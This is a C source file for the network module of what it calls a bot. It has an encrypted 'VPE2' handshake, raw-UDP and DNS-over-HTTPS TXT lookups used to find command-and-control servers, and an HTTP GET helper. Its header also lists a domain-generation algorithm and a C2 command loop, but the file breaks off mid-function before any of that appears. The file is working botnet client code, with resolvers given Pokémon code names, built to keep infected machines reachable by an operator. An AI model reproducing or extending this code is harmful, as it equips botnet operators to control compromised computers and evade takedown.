/* connection.c — Encrypted TCP connection module (pure C, GCC 4.1.2 compatible)
 *
 * VPE2 handshake, DNS resolution (DoH / raw UDP), DGA, HTTP GET,
 * C2 session handler (auth + command loop).
 */

#include "bot.h"

/* ======================================================================
   FORWARD DECLARATIONS / STATIC HELPERS
   ====================================================================== */

static void set_socket_timeout(int fd, int sec);
static int  tcp_connect(const char *host, const char *port, int timeout_sec);
static int  build_dns_query(const char *domain, uint16_t qtype, uint8_t *buf, size_t bufsz);
static int  parse_dns_response(const uint8_t *resp, size_t resp_len, uint16_t qtype, strarr *out);

/* ======================================================================
   set_socket_timeout — set SO_RCVTIMEO + SO_SNDTIMEO on a socket
   ====================================================================== */

static void set_socket_timeout(int fd, int sec)
{
    struct timeval tv;
    tv.tv_sec  = sec;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
}

/* ======================================================================
   tcp_connect — non-blocking connect with poll timeout
   ====================================================================== */

static int tcp_connect(const char *host, const char *port, int timeout_sec)
{
    struct addrinfo hints, *res, *rp;
    int fd, ret, err;
    socklen_t elen;
    struct pollfd pfd;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    ret = getaddrinfo(host, port, &hints, &res);
    if (ret != 0) {
        debug_log("getaddrinfo(%s:%s): %s", host, port, gai_strerror(ret));
        return -1;
    }

    fd = -1;
    for (rp = res; rp != NULL; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;

        /* set non-blocking */
        {
            int flags = fcntl(fd, F_GETFL, 0);
            fcntl(fd, F_SETFL, flags | O_NONBLOCK);
        }

        ret = connect(fd, rp->ai_addr, rp->ai_addrlen);
        if (ret == 0) {
            /* connected immediately */
            int flags = fcntl(fd, F_GETFL, 0);
            fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
            break;
        }
        if (errno != EINPROGRESS) {
            close(fd);
            fd = -1;
            continue;
        }

        /* wait for connect with poll */
        pfd.fd     = fd;
        pfd.events = POLLOUT;
        ret = poll(&pfd, 1, timeout_sec * 1000);
        if (ret <= 0) {
            close(fd);
            fd = -1;
            continue;
        }

        /* check for connect error */
        elen = sizeof(err);
        err  = 0;
        getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen);
        if (err != 0) {
            close(fd);
            fd = -1;
            continue;
        }

        /* restore blocking mode */
        {
            int flags = fcntl(fd, F_GETFL, 0);
            fcntl(fd, F_SETFL, flags & ~O_NONBLOCK);
        }
        break;
    }

    freeaddrinfo(res);
    return fd;
}

/* ======================================================================
   parse_address — split "host:port" into dstr components
   ====================================================================== */

int parse_address(const char *addr, dstr *host, dstr *port)
{
    const char *colon;

    if (!addr || !host || !port) return 0;

    ds_init(host);
    ds_init(port);

    /* handle [ipv6]:port */
    if (addr[0] == '[') {
        const char *bracket = strchr(addr, ']');
        if (!bracket) return 0;
        ds_setn(host, addr + 1, (size_t)(bracket - addr - 1));
        if (bracket[1] == ':') {
            ds_set(port, bracket + 2);
        } else {
            ds_set(port, "443");
        }
        return 1;
    }

    colon = strrchr(addr, ':');
    if (!colon) {
        ds_set(host, addr);
        ds_set(port, "443");
        return 1;
    }

    ds_setn(host, addr, (size_t)(colon - addr));
    ds_set(port, colon + 1);
    return 1;
}

/* ======================================================================
   vpn_connect — TCP connect + VPE2 encrypted handshake
   X25519 forward secrecy + HMAC-SHA256 key derivation
   ====================================================================== */

conn_t *vpn_connect(const char *host, const char *port)
{
    int fd;
    conn_t *c;
    uint8_t client_nonce[32];
    uint8_t client_priv[32], client_pub[32];
    uint8_t server_nonce[32], server_pub[32];
    uint8_t handshake_buf[4 + 32 + 32]; /* "VPE2" + nonce + x25519_pub */
    uint8_t shared_secret[32];
    uint8_t session_key[32], key_c2s[32], key_s2c[32], hmac_key[32];
    uint8_t ikm[96]; /* client_nonce || server_nonce || shared_secret */
    ssize_t n;
    size_t off;

    debug_log("vpn_connect: connecting to %s:%s (VPE2)", host, port);

    fd = tcp_connect(host, port, 15);
    if (fd < 0) {
        debug_log("vpn_connect: tcp_connect failed");
        return NULL;
    }

    set_socket_timeout(fd, 10);

    /* Generate client nonce + ephemeral X25519 keypair */
    urandom_bytes(client_nonce, 32);
    urandom_bytes(client_priv, 32);
    x25519_scalarmult_base(client_pub, client_priv);

    /* Send "VPE2" + client_nonce + client_x25519_pub */
    memcpy(handshake_buf, "VPE2", 4);
    memcpy(handshake_buf + 4, client_nonce, 32);
    memcpy(handshake_buf + 36, client_pub, 32);

    off = 0;
    while (off < sizeof(handshake_buf)) {
        n = write(fd, handshake_buf + off, sizeof(handshake_buf) - off);
        if (n <= 0) {
            close(fd);
            goto cleanup_early;
        }
        off += (size_t)n;
    }

    /* Read server_nonce (32 bytes) + server_x25519_pub (32 bytes) */
    {
        uint8_t resp[64];
        off = 0;
        while (off < 64) {
            n = read(fd, resp + off, 64 - off);
            if (n <= 0) {
                close(fd);
                goto cleanup_early;
            }
            off += (size_t)n;
        }
        memcpy(server_nonce, resp, 32);
        memcpy(server_pub, resp + 32, 32);
    }

    /* Compute X25519 shared secret */
    x25519_scalarmult(shared_secret, client_priv, server_pub);

    /* Derive session key: HMAC-SHA256(SYNC_TOKEN, client_nonce || server_nonce || shared_secret) */
    memcpy(ikm, client_nonce, 32);
    memcpy(ikm + 32, server_nonce, 32);
    memcpy(ikm + 64, shared_secret, 32);
    hmac_sha256((const uint8_t *)SYNC_TOKEN, strlen(SYNC_TOKEN), ikm, 96, session_key);

    /* Derive directional keys + HMAC key */
    hmac_sha256(session_key, 32, (const uint8_t *)"c2s", 3, key_c2s);
    hmac_sha256(session_key, 32, (const uint8_t *)"s2c", 3, key_s2c);
    hmac_sha256(session_key, 32, (const uint8_t *)"hmac", 4, hmac_key);

    /* Allocate conn_t */
    c = (conn_t *)malloc(sizeof(conn_t));
    if (!c) {
        close(fd);
        goto cleanup_early;
    }

    c->fd    = fd;
    c->valid = 1;

    /* Init ciphers: send = c2s, recv = s2c */
    cipher_init(&c->send_cipher, key_c2s);
    cipher_init(&c->recv_cipher, key_s2c);
    memcpy(c->hmac_key, hmac_key, 32);

    /* Zero all sensitive locals */
    explicit_bzero(client_priv, 32);
    explicit_bzero(client_nonce, 32);
    explicit_bzero(server_nonce, 32);
    explicit_bzero(shared_secret, 32);
    explicit_bzero(session_key, 32);
    explicit_bzero(key_c2s, 32);
    explicit_bzero(key_s2c, 32);
    explicit_bzero(hmac_key, 32);
    explicit_bzero(ikm, 96);
    explicit_bzero(handshake_buf, sizeof(handshake_buf));

    debug_log("vpn_connect: VPE2 handshake complete (X25519 + HMAC-SHA256)");
    return c;

cleanup_early:
    explicit_bzero(client_priv, 32);
    explicit_bzero(client_nonce, 32);
    explicit_bzero(shared_secret, 32);
    explicit_bzero(session_key, 32);
    explicit_bzero(ikm, 96);
    explicit_bzero(handshake_buf, sizeof(handshake_buf));
    return NULL;
}

/* ======================================================================
   vpn_close — close fd, free conn_t
   ====================================================================== */

void vpn_close(conn_t *c)
{
    if (!c) return;
    if (c->fd >= 0) close(c->fd);
    c->valid = 0;
    /* Zero all key material before freeing */
    explicit_bzero(&c->send_cipher, sizeof(c->send_cipher));
    explicit_bzero(&c->recv_cipher, sizeof(c->recv_cipher));
    explicit_bzero(c->hmac_key, 32);
    free(c);
}

/* ======================================================================
   vpn_write — encrypt + write to fd
   ====================================================================== */

void vpn_write(conn_t *c, const char *data, size_t len)
{
    uint8_t *tmp;
    size_t off;
    ssize_t n;

    if (!c || !c->valid || c->fd < 0 || len == 0) return;

    tmp = (uint8_t *)malloc(len);
    if (!tmp) return;
    memcpy(tmp, data, len);

    cipher_crypt(&c->send_cipher, tmp, len);

    off = 0;
    while (off < len) {
        n = write(c->fd, tmp + off, len - off);
        if (n <= 0) {
            c->valid = 0;
            break;
        }
        off += (size_t)n;
    }

    free(tmp);
}

/* ======================================================================
   vpn_writes — convenience: vpn_write(c, str, strlen(str))
   ====================================================================== */

void vpn_writes(conn_t *c, const char *str)
{
    if (str) vpn_write(c, str, strlen(str));
}

/* ======================================================================
   vpn_read_line — read byte-by-byte, decrypt, accumulate until '\n'
   ====================================================================== */

dstr vpn_read_line(conn_t *c, int timeout_sec)
{
    dstr line;
    struct pollfd pfd;
    int ret;

    ds_init(&line);
    if (!c || !c->valid || c->fd < 0) return line;

    pfd.fd     = c->fd;
    pfd.events = POLLIN;

    for (;;) {
        uint8_t byte;
        ssize_t n;

        ret = poll(&pfd, 1, timeout_sec * 1000);
        if (ret < 0) {
            if (errno == EINTR) continue; /* signal interrupted, retry */
            break;
        }
        if (ret == 0) {
            /* timeout */
            break;
        }

        n = read(c->fd, &byte, 1);
        if (n < 0) {
            if (errno == EINTR) continue; /* signal interrupted, retry */
            c->valid = 0;
            break;
        }
        if (n == 0) {
            c->valid = 0;
            break;
        }

        cipher_crypt(&c->recv_cipher, &byte, 1);

        if (byte == '\n') break;
        ds_catc(&line, (char)byte);
    }

    /* strip trailing \r */
    while (ds_len(&line) > 0 && ds_back(&line) == '\r') {
        ds_pop(&line);
    }

    return line;
}

/* ======================================================================
   vpn_read_byte — read + decrypt one byte, returns byte or -1 on error/timeout
   ====================================================================== */

int vpn_read_byte(conn_t *c, int timeout_sec)
{
    struct pollfd pfd;
    uint8_t byte;
    ssize_t n;
    int ret;

    if (!c || !c->valid || c->fd < 0) return -1;

    pfd.fd     = c->fd;
    pfd.events = POLLIN;

    for (;;) {
        ret = poll(&pfd, 1, timeout_sec * 1000);
        if (ret < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (ret == 0) return -1; /* timeout */

        n = read(c->fd, &byte, 1);
        if (n < 0) {
            if (errno == EINTR) continue;
            c->valid = 0;
            return -1;
        }
        if (n == 0) { c->valid = 0; return -1; }

        cipher_crypt(&c->recv_cipher, &byte, 1);
        return (int)byte;
    }
}

/* ======================================================================
   vpn_read_exact — read + decrypt exactly n bytes, returns 0 on success, -1 on error
   ====================================================================== */

int vpn_read_exact(conn_t *c, void *buf, size_t n, int timeout_sec)
{
    size_t got = 0;
    while (got < n) {
        int b = vpn_read_byte(c, timeout_sec);
        if (b < 0) return -1;
        ((uint8_t *)buf)[got++] = (uint8_t)b;
    }
    return 0;
}

/* ======================================================================
   is_valid_hostname — quick check (letters, digits, -, .)
   ====================================================================== */

int is_valid_hostname(const char *h)
{
    size_t len, i;
    int has_dot;

    if (!h || *h == '\0') return 0;

    len     = strlen(h);
    has_dot = 0;

    for (i = 0; i < len; i++) {
        char ch = h[i];
        if (ch == '.') { has_dot = 1; continue; }
        if (ch == '-' || ch == '_') continue;
        if (ch >= 'a' && ch <= 'z') continue;
        if (ch >= 'A' && ch <= 'Z') continue;
        if (ch >= '0' && ch <= '9') continue;
        return 0;
    }

    return has_dot;
}

/* ======================================================================
   parse_txt_addresses — split TXT data into "host:port" entries
   Expects comma-separated or newline-separated address list.
   ====================================================================== */

strarr parse_txt_addresses(const char *data)
{
    strarr result;
    const char *p;
    dstr token;

    sa_init(&result);
    if (!data || *data == '\0') return result;

    ds_init(&token);
    p = data;

    while (*p) {
        if (*p == ',' || *p == '\n' || *p == '\r' || *p == ';' || *p == ' ') {
            if (ds_len(&token) > 0) {
                /* must contain ':' */
                if (strchr(ds_cstr(&token), ':')) {
                    sa_pushds(&result, &token);
                }
                ds_clear(&token);
            }
            p++;
        } else {
            ds_catc(&token, *p);
            p++;
        }
    }

    if (ds_len(&token) > 0 && strchr(ds_cstr(&token), ':')) {
        sa_pushds(&result, &token);
    }

    ds_free(&token);
    return result;
}

/* ======================================================================
   parse_txt_ips — extract plain IPv4 addresses from TXT record data.
   Splits on comma, semicolon, space, newline. Validates each token
   with inet_pton so only real IPs are returned.
   ====================================================================== */

strarr parse_txt_ips(const char *data)
{
    strarr result;
    const char *p;
    dstr token;

    sa_init(&result);
    if (!data || *data == '\0') return result;

    ds_init(&token);
    p = data;

    while (*p) {
        if (*p == ',' || *p == ';' || *p == ' ' || *p == '\n' || *p == '\r' || *p == '\t') {
            if (ds_len(&token) > 0) {
                struct in_addr tmp;
                if (inet_pton(AF_INET, ds_cstr(&token), &tmp) == 1) {
                    sa_pushds(&result, &token);
                }
                ds_clear(&token);
            }
            p++;
        } else {
            ds_catc(&token, *p);
            p++;
        }
    }

    if (ds_len(&token) > 0) {
        struct in_addr tmp;
        if (inet_pton(AF_INET, ds_cstr(&token), &tmp) == 1) {
            sa_pushds(&result, &token);
        }
    }

    ds_free(&token);
    return result;
}

/* ======================================================================
   dns_txt_resolve_ips — query TXT record for domain, return parsed IPs.
   Tries each resolver in g_resolver_pool via raw UDP.
   ====================================================================== */

strarr dns_txt_resolve_ips(const char *domain)
{
    strarr result;
    size_t i;

    sa_init(&result);
    if (!domain || *domain == '\0') return result;

    for (i = 0; i < sa_count(&g_resolver_pool); i++) {
        strarr txts = dns_txt_query(domain, sa_get(&g_resolver_pool, i));
        if (sa_count(&txts) > 0) {
            size_t j;
            for (j = 0; j < sa_count(&txts); j++) {
                strarr ips = parse_txt_ips(sa_get(&txts, j));
                sa_insert(&result, &ips);
                sa_free(&ips);
            }
            sa_free(&txts);
            if (sa_count(&result) > 0) return result;
        }
        sa_free(&txts);
    }

    return result;
}

/* ======================================================================
   DNS WIRE FORMAT — build_dns_query / parse_dns_response
   ====================================================================== */

static int build_dns_query(const char *domain, uint16_t qtype, uint8_t *buf, size_t bufsz)
{
    /* Build a raw DNS query packet for the given domain and query type.
     * Returns total packet length, or -1 on error. */
    size_t pos;
    const char *p, *dot;
    uint16_t txid;

    if (!domain || !buf || bufsz < 64) return -1;

    txid = (uint16_t)(urandom_u32() & 0xFFFF);

    /* header: 12 bytes */
    memset(buf, 0, 12);
    buf[0] = (uint8_t)(txid >> 8);
    buf[1] = (uint8_t)(txid & 0xFF);
    buf[2] = 0x01; /* RD=1 */
    buf[3] = 0x00;
    buf[4] = 0x00; buf[5] = 0x01; /* QDCOUNT=1 */

    pos = 12;

    /* encode domain labels */
    p = domain;
    while (*p) {
        size_t lablen;
        dot = strchr(p, '.');
        if (!dot) dot = p + strlen(p);
        lablen = (size_t)(dot - p);
        if (lablen == 0 || lablen > 63) return -1;
        if (pos + 1 + lablen >= bufsz) return -1;
        buf[pos++] = (uint8_t)lablen;
        memcpy(buf + pos, p, lablen);
        pos += lablen;
        p = (*dot) ? dot + 1 : dot;
    }
    if (pos >= bufsz) return -1;
    buf[pos++] = 0x00; /* root label */

    /* QTYPE + QCLASS */
    if (pos + 4 > bufsz) return -1;
    buf[pos++] = (uint8_t)(qtype >> 8);
    buf[pos++] = (uint8_t)(qtype & 0xFF);
    buf[pos++] = 0x00;
    buf[pos++] = 0x01; /* IN class */

    return (int)pos;
}

/* skip a DNS name (handles compression pointers) */
static int dns_skip_name(const uint8_t *pkt, size_t pkt_len, size_t off)
{
    int jumps = 0;
    while (off < pkt_len) {
        uint8_t label = pkt[off];
        if (label == 0) { return (int)(off + 1); }
        if ((label & 0xC0) == 0xC0) {
            /* pointer — two bytes */
            return (int)(off + 2);
        }
        off += 1 + label;
        jumps++;
        if (jumps > 128) return -1;
    }
    return -1;
}

static int parse_dns_response(const uint8_t *resp, size_t resp_len, uint16_t qtype, strarr *out)
{
    uint16_t qdcount, ancount;
    size_t off;
    int i;

    if (resp_len < 12) return -1;

    qdcount = ((uint16_t)resp[4] << 8) | resp[5];
    ancount = ((uint16_t)resp[6] << 8) | resp[7];

    off = 12;

    /* skip question section */
    for (i = 0; i < (int)qdcount; i++) {
        int end = dns_skip_name(resp, resp_len, off);
        if (end < 0) return -1;
        off = (size_t)end + 4; /* skip QTYPE + QCLASS */
        if (off > resp_len) return -1;
    }

    /* parse answers */
    for (i = 0; i < (int)ancount; i++) {
        uint16_t rtype, rclass, rdlen;
        int end;

        end = dns_skip_name(resp, resp_len, off);
        if (end < 0) return -1;
        off = (size_t)end;

        if (off + 10 > resp_len) return -1;

        rtype  = ((uint16_t)resp[off] << 8) | resp[off + 1];
        rclass = ((uint16_t)resp[off + 2] << 8) | resp[off + 3];
        /* TTL at off+4..off+7 */
        rdlen  = ((uint16_t)resp[off + 8] << 8) | resp[off + 9];
        off += 10;

        if (off + rdlen > resp_len) return -1;

        if (rtype == qtype && rclass == 0x0001) {
            if (qtype == 16 /* TXT */) {
                /* TXT records: one or more length-prefixed strings */
                size_t roff = off;
                size_t rend = off + rdlen;
                dstr txt;
                ds_init(&txt);
                while (roff < rend) {
                    uint8_t slen = resp[roff++];
                    if (roff + slen > rend) break;
                    ds_catn(&txt, (const char *)(resp + roff), slen);
                    roff += slen;
                }
                if (ds_len(&txt) > 0) {
                    sa_pushds(out, &txt);
                }
                ds_free(&txt);
            } else if (qtype == 1 /* A */ && rdlen == 4) {
                char ipbuf[32];
                snprintf(ipbuf, sizeof(ipbuf), "%d.%d.%d.%d",
                         resp[off], resp[off+1], resp[off+2], resp[off+3]);
                sa_push(out, ipbuf);
            }
        }

        off += rdlen;
    }

    return (int)sa_count(out);
}

/* ======================================================================
   dns_txt_query — raw UDP DNS TXT query to a specific server
   ====================================================================== */

strarr dns_txt_query(const char *domain, const char *server)
{
    strarr result;
    uint8_t qbuf[512], rbuf[4096];
    int qlen, fd, ret;
    ssize_t rlen;
    struct sockaddr_in sa;
    struct pollfd pfd;
    dstr srv_host, srv_port;

    sa_init(&result);

    /* parse server address */
    ds_init(&srv_host);
    ds_init(&srv_port);
    if (!parse_address(server, &srv_host, &srv_port)) {
        ds_set(&srv_host, server);
        ds_set(&srv_port, "53");
    }

    qlen = build_dns_query(domain, 16 /* TXT */, qbuf, sizeof(qbuf));
    if (qlen < 0) {
        ds_free(&srv_host);
        ds_free(&srv_port);
        return result;
    }

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        ds_free(&srv_host);
        ds_free(&srv_port);
        return result;
    }

    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)atoi(ds_cstr(&srv_port)));
    inet_pton(AF_INET, ds_cstr(&srv_host), &sa.sin_addr);

    debug_log("dns_txt_query: sending %d bytes to %s:%s",
              qlen, ds_cstr(&srv_host), ds_cstr(&srv_port));

    ret = (int)sendto(fd, qbuf, (size_t)qlen, 0,
                      (struct sockaddr *)&sa, sizeof(sa));
    if (ret <= 0) {
        debug_log("dns_txt_query: sendto failed: %s", strerror(errno));
        close(fd);
        ds_free(&srv_host);
        ds_free(&srv_port);
        return result;
    }

    pfd.fd     = fd;
    pfd.events = POLLIN;
    ret = poll(&pfd, 1, 5000);
    if (ret > 0) {
        rlen = recvfrom(fd, rbuf, sizeof(rbuf), 0, NULL, NULL);
        debug_log("dns_txt_query: recvfrom returned %zd bytes", rlen);
        if (rlen > 0) {
            parse_dns_response(rbuf, (size_t)rlen, 16, &result);
            debug_log("dns_txt_query: parsed %zu TXT records", sa_count(&result));
        }
    } else {
        debug_log("dns_txt_query: poll timeout/error (ret=%d)", ret);
    }

    close(fd);
    ds_free(&srv_host);
    ds_free(&srv_port);
    return result;
}

/* ======================================================================
   palkia — DNS TXT lookup via system resolvers (iterates g_resolver_pool)
   ====================================================================== */

strarr palkia(const char *domain)
{
    strarr result;
    size_t i;

    sa_init(&result);

    debug_log("palkia: resolver_pool has %zu entries", sa_count(&g_resolver_pool));
    for (i = 0; i < sa_count(&g_resolver_pool); i++) {
        debug_log("palkia: trying resolver[%zu] = '%s'", i, sa_get(&g_resolver_pool, i));
        strarr r = dns_txt_query(domain, sa_get(&g_resolver_pool, i));
        if (sa_count(&r) > 0) {
            sa_insert(&result, &r);
            sa_free(&r);
            break;
        }
        sa_free(&r);
    }

    return result;
}

/* ======================================================================
   darkrai — DNS TXT lookup via DoH (DNS-over-HTTPS JSON API)
   Uses g_doh_servers and g_doh_fallback lists.
   ====================================================================== */

strarr darkrai(const char *domain)
{
    strarr result;
    strarr *pools[2];
    int p;

    sa_init(&result);
    pools[0] = &g_doh_servers;
    pools[1] = &g_doh_fallback;

    for (p = 0; p < 2; p++) {
        size_t i;
        for (i = 0; i < sa_count(pools[p]); i++) {
            dstr url;
            dstr body;

            ds_init(&url);
            ds_set(&url, sa_get(pools[p], i));
            ds_cat(&url, "?name=");
            ds_cat(&url, domain);
            ds_cat(&url, "&type=TXT");

            body = http_get(ds_cstr(&url), 10);
            ds_free(&url);

            if (ds_len(&body) > 0) {
                /* parse JSON-ish response for "data" fields containing quoted strings */
                const char *src = ds_cstr(&body);
                const char *dp;

                dp = src;
                while ((dp = strstr(dp, "\"data\"")) != NULL) {
                    const char *q1, *q2;
                    dp += 6;
                    /* find colon then quoted value */
                    q1 = strchr(dp, '\"');
                    if (!q1) break;
                    q1++;
                    /* skip leading quote that might be the TXT record wrapping */
                    if (*q1 == '\\' && *(q1 + 1) == '\"') q1 += 2;
                    q2 = strchr(q1, '\"');
                    if (!q2) break;
                    /* might have trailing escaped quote */
                    if (q2 > q1 && *(q2 - 1) == '\\') {
                        q2 = strchr(q2 + 1, '\"');
                        if (!q2) break;
                    }
                    {
                        dstr val;
                        ds_init(&val);
                        ds_setn(&val, q1, (size_t)(q2 - q1));
                        if (ds_len(&val) > 0) {
                            sa_pushds(&result, &val);
                        }
                        ds_free(&val);
                    }
                }

                ds_free(&body);
                if (sa_count(&result) > 0) return result;
            } else {
                ds_free(&body);
            }
        }
    }

    return result;
}

/* ======================================================================
   rayquaza — resolve domain via DoH, return first A record IP
   ====================================================================== */

dstr rayquaza(const char *domain)
{
    dstr ip;
    strarr *pools[2];
    int p;

    ds_init(&ip);
    pools[0] = &g_doh_servers;
    pools[1] = &g_doh_fallback;

    for (p = 0; p < 2; p++) {
        size_t i;
        for (i = 0; i < sa_count(pools[p]); i++) {
            dstr url, body;
            const char *src, *dp;

            ds_init(&url);
            ds_set(&url, sa_get(pools[p], i));
            ds_cat(&url, "?name=");
            ds_cat(&url, domain);
            ds_cat(&url, "&type=A");

            body = http_get(ds_cstr(&url), 10);
            ds_free(&url);

            if (ds_len(&body) == 0) {
                ds_free(&body);
                continue;
            }

            /* look for "data":"<IP>" in JSON response */
            src = ds_cstr(&body);
            dp  = strstr(src, "\"data\"");
            while (dp) {
                const char *q1, *q2;
                dp += 6;
                q1 = strchr(dp, '\"');
                if (!q1) break;
                q1++;
                q2 = strchr(q1, '\"');
                if (!q2) break;
                {
                    dstr cand;
                    ds_init(&cand);
                    ds_setn(&cand, q1, (size_t)(q2 - q1));
                    /* check if it looks like an IP */
                    {
                        struct in_addr tmp;
                        if (inet_pton(AF_INET, ds_cstr(&cand), &tmp) == 1) {
                            ds_set(&ip, ds_cstr(&cand));
                            ds_free(&cand);
                            ds_free(&body);
                            return ip;
                        }
                    }
                    ds_free(&cand);
                }
                dp = strstr(q2, "\"data\"");
            }

            ds_free(&body);
        }
    }

    return ip;
}

/* ======================================================================
   http_get — plain HTTP GET (no HTTPS). Returns body as dstr.
   ====================================================================== */

dstr http_get(const char *url, int timeout_sec)
{
    dstr result;
    dstr host_str, port_str, path_str;
    const char *p, *slash, *colon;
    int fd;
    dstr req;
    char buf[4096];
    ssize_t n;
    dstr raw;
    const char *body_start;

    ds_init(&result);
    if (!url) return result;

    /* parse URL: http://host[:port]/path */
    p = url;
    if (strncmp(p, "http://", 7) == 0) {
        p += 7;
    } else if (strncmp(p, "https://", 8) == 0) {
        /* we don't support https in http_get */
        return result;
    }

    ds_init(&host_str);
    ds_init(&port_str);
    ds_init(&path_str);

    slash = strchr(p, '/');
    if (slash) {
        dstr hostport;
        ds_init(&hostport);
        ds_setn(&hostport, p, (size_t)(slash - p));
        ds_set(&path_str, slash);

        colon = strchr(ds_cstr(&hostport), ':');
        if (colon) {
            ds_setn(&host_str, ds_cstr(&hostport), (size_t)(colon - ds_cstr(&hostport)));
            ds_set(&port_str, colon + 1);
        } else {
            ds_set(&host_str, ds_cstr(&hostport));
            ds_set(&port_str, "80");
        }
        ds_free(&hostport);
    } else {
        colon = strchr(p, ':');
        if (colon) {
            ds_setn(&host_str, p, (size_t)(colon - p));
            ds_set(&port_str, colon + 1);
        } else {
            ds_set(&host_str, p);
            ds_set(&port_str, "80");
        }
        ds_set(&path_str, "/");
    }

    fd = tcp_connect(ds_cstr(&host_str), ds_cstr(&port_str), timeout_sec);
    if (fd < 0) {
        ds_free(&host_str);
        ds_free(&port_str);
        ds_free(&path_str);
        return result;
    }

    set_socket_timeout(fd, timeout_sec);

    /* build HTTP request */
    ds_init(&req);
    ds_cat(&req, "GET ");
    ds_catds(&req, &path_str);
    ds_cat(&req, " HTTP/1.0\r\nHost: ");
    ds_catds(&req, &host_str);
    ds_cat(&req, "\r\nAccept: ");
    if (ds_len(&g_dns_json_accept) > 0) {
        ds_catds(&req, &g_dns_json_accept);
    } else {
        ds_cat(&req, "*/*");
    }
    ds_cat(&req, "\r\nConnection: close\r\n\r\n");

    {
        size_t off = 0;
        size_t total = ds_len(&req);
        while (off < total) {
            n = write(fd, ds_cstr(&req) + off, total - off);
            if (n <= 0) break;
            off += (size_t)n;
        }
    }
    ds_free(&req);

    /* read response */
    ds_init(&raw);
    for (;;) {
        n = read(fd, buf, sizeof(buf));
        if (n <= 0) break;
        ds_catn(&raw, buf, (size_t)n);
    }

    close(fd);
    ds_free(&host_str);
    ds_free(&port_str);
    ds_free(&path_str);

    /* find body after \r\n\r\n */
    body_start = strstr(ds_cstr(&raw), "\r\n\r\n");
    if (body_start) {
        body_start += 4;
        ds_set(&result, body_start);
    } else {
        /* no header separator — return everything */
        ds_set(&result, ds_cstr(&raw));
    }

    ds_free(&raw);
    return result;
}

/* ======================================================================
   expand_ip_ports — pair an IP with a comma-separated port string.
   Pushes "ip:p1", "ip:p2", ... into result.
   ====================================================================== */

static void expand_ip_ports(strarr *result, const char *ip, const char *ports)
{
    const char *pp;
    dstr tok;

    if (!ports || *ports == '\0') ports = "443";

    ds_init(&tok);
    pp = ports;
    while (*pp) {
        if (*pp == ',') {
            if (ds_len(&tok) > 0) {
                dstr entry;
                ds_init(&entry);
                ds_set(&entry, ip);
                ds_catc(&entry, ':');
                ds_catds(&entry, &tok);
                sa_pushds(result, &entry);
                ds_free(&entry);
                ds_clear(&tok);
            }
            pp++;
        } else {
            ds_catc(&tok, *pp);
            pp++;
        }
    }
    if (ds_len(&tok) > 0) {
        dstr entry;
        ds_init(&entry);
        ds_set(&entry, ip);
        ds_catc(&entry, ':');
        ds_catds(&entry, &tok);
        sa_pushds(result, &entry);
        ds_free(&entry);
    }
    ds_free(&tok);
}

/* ======================================================================
   resolve_one — resolve a "decoded" config entry to addresses.
   Tries: direct "host:port", DNS TXT fallback, DoH fallback.
   ====================================================================== */

strarr resolve_one(const char *decoded)
{
    strarr result;
    int is_ip = 0;
    dstr txt_domain;
    dstr cfg_port;       /* port from original config entry, used for bare-IP TXT */

    sa_init(&result);
    if (!decoded || *decoded == '\0') return result;

    ds_init(&txt_domain);
    ds_init(&cfg_port);

    /* parse host:port(s) if present — port may be comma-separated */
    if (strchr(decoded, ':')) {
        dstr h, p;
        if (parse_address(decoded, &h, &p)) {
            struct in_addr tmp;
            if (inet_pton(AF_INET, ds_cstr(&h), &tmp) == 1) {
                /* direct IP:port(s) — expand comma-separated ports */
                is_ip = 1;
                expand_ip_ports(&result, ds_cstr(&h), ds_cstr(&p));
            } else if (is_valid_hostname(ds_cstr(&h))) {
                /* hostname — extract for TXT lookup first */
                ds_set(&txt_domain, ds_cstr(&h));
                ds_set(&cfg_port, ds_cstr(&p));
            }
            ds_free(&h);
            ds_free(&p);
            if (is_ip) { ds_free(&txt_domain); ds_free(&cfg_port); return result; }
        }
    }

    /* determine domain to query TXT records for */
    {
        const char *domain = ds_len(&txt_domain) > 0 ? ds_cstr(&txt_domain) : decoded;

        /* try DNS TXT via system resolvers */
        debug_log("resolve_one: TXT query for %s", domain);
        {
            strarr dns = palkia(domain);
            if (sa_count(&dns) > 0) {
                size_t i;
                for (i = 0; i < sa_count(&dns); i++) {
                    /* first try host:port format */
                    strarr addrs = parse_txt_addresses(sa_get(&dns, i));
                    if (sa_count(&addrs) > 0) {
                        sa_insert(&result, &addrs);
                    } else {
                        /* try bare IPs — pair with cfg_port (may be multi-port) */
                        strarr ips = parse_txt_ips(sa_get(&dns, i));
                        size_t j;
                        const char *pstr = ds_len(&cfg_port) > 0 ? ds_cstr(&cfg_port) : "443";
                        for (j = 0; j < sa_count(&ips); j++) {
                            expand_ip_ports(&result, sa_get(&ips, j), pstr);
                        }
                        sa_free(&ips);
                    }
                    sa_free(&addrs);
                }
            }
            sa_free(&dns);
            if (sa_count(&result) > 0) { ds_free(&txt_domain); ds_free(&cfg_port); return result; }
        }

        /* fallback: DoH TXT */
        {
            strarr dns = darkrai(domain);
            if (sa_count(&dns) > 0) {
                size_t i;
                for (i = 0; i < sa_count(&dns); i++) {
                    strarr addrs = parse_txt_addresses(sa_get(&dns, i));
                    if (sa_count(&addrs) > 0) {
                        sa_insert(&result, &addrs);
                    } else {
                        strarr ips = parse_txt_ips(sa_get(&dns, i));
                        size_t j;
                        const char *pstr = ds_len(&cfg_port) > 0 ? ds_cstr(&cfg_port) : "443";
                        for (j = 0; j < sa_count(&ips); j++) {
                            expand_ip_ports(&result, sa_get(&ips, j), pstr);
                        }
                        sa_free(&ips);
                    }
                    sa_free(&addrs);
                }
            }
            sa_free(&dns);
            if (sa_count(&result) > 0) { ds_free(&txt_domain); ds_free(&cfg_port); return result; }
        }
    }

    /* last resort: use decoded address directly (relies on A record / getaddrinfo) */
    if (ds_len(&txt_domain) > 0) {
